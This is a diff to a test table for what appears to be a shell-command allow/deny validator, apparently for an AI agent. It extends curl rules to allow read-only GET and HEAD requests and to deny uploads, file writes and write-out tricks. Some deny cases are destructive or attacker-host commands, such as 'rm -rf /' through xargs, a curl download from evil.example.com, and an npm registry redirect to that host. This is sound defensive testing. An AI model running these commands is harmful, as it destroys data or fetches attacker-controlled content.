@@ -37,7 +37,7 @@ CASES = [
     (False, "xargs rm"),
     (False, "xargs sh -c 'rm -rf /'"),
     (False, "echo $(rm -rf /tmp/x)"),
-    (False, "echo $(curl http://evil.example.com)"),
+    (False, "echo $(curl -O http://evil.example.com)"),
     (False, "npm install"),
     (False, "npm config set registry http://evil.example.com"),
     (False, "claude update"),
@@ -46,7 +46,6 @@ CASES = [
     (False, "herdr pane close w1:p1"),
     (False, "herdr server stop"),
     (False, "cat f > out.txt"),
-    (False, "curl -sS http://example.com"),
 
     # --- own cases: nesting-depth limit ---
     (True, "echo $(id)"),
@@ -101,10 +100,42 @@ CASES = [
     (True, "grep -rn foo . 2>&1 | head"),
     (True, "ls 2>/dev/null"),
 
-    # --- own cases: SIMPLE additions and curl/wget deny ---
+    # --- own cases: SIMPLE additions and wget deny ---
     (True, "ps aux | grep python"),
     (True, "id -u"),
     (False, "wget http://example.com/x"),
+
+    # --- curl read-only GET/HEAD surface (allow) ---
+    (True, "curl -s -m 5 \"http://192.168.0.12:8123/?query=SELECT%201\""),
+    (True, "curl -sS https://x"),
+    (True, "curl -sfL -m 5 -H 'A: b' https://x"),
+    (True, "curl -m5 https://x"),
+    (True, "curl -I https://x"),
+    (True, "curl -X GET https://x"),
+    (True, "curl --request=head https://x"),
+    (True, "curl -H -o https://x"),
+    (True, "curl --version"),
+    (True, "curl -s -w '%{http_code}' https://x"),
+    (True, "curl -w @fmt https://x"),
+
+    # --- curl file-write / upload / non-GET / unknown-flag surface (deny) ---
+    (False, "curl -o out.txt https://x"),
+    (False, "curl -O https://x"),
+    (False, "curl -d 'a=1' https://x"),
+    (False, "curl -X POST https://x"),
+    (False, "curl --data-binary @f https://x"),
+    (False, "curl -T f https://x"),
+    (False, "curl -K cfg https://x"),
+    (False, "curl -so out https://x"),
+    (False, "curl -sZ https://x"),
+    (False, "curl -w '%output{/tmp/x}%{http_code}' https://x"),
+    (False, "curl -w'%OUTPUT{/tmp/x}' https://x"),
+    (False, "curl --write-out='%output{>>/tmp/x}' https://x"),
+    (False, "curl --write-out %output{/tmp/x} https://x"),
+    (False, "curl"),
+    (False, "wget https://x"),
+    (False, "wget -O - https://x"),
+    (False, "curl https://x > f"),
 
     # --- follow-up: command wrappers re-check the wrapped command (deny) ---
     (False, "env rm -rf /tmp/x"),
